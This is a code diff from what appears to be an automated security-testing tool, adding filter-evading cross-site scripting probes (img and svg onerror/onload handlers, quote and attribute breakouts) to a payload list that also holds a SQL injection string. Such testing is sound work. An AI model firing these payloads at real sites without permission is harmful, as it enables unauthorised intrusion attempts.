@@ -443,6 +443,10 @@ class ConcurrentHuntRunner:
                 {"payload": "<script>alert(1)</script>"},
                 {"payload": "<img src=x onerror=alert(1)>"},
                 {"payload": "javascript:alert(1)"},
+                {"payload": "<img/Src/OnError=(alert)(1)>", "param": "id"},
+                {"payload": "<svg/onload=alert(1)>"},
+                {"payload": "'-alert(1)-'"},
+                {"payload": "\"><img src=x onerror=alert(1)>"},
             ],
             "sqli": [
                 {"payload": "' OR '1'='1"},
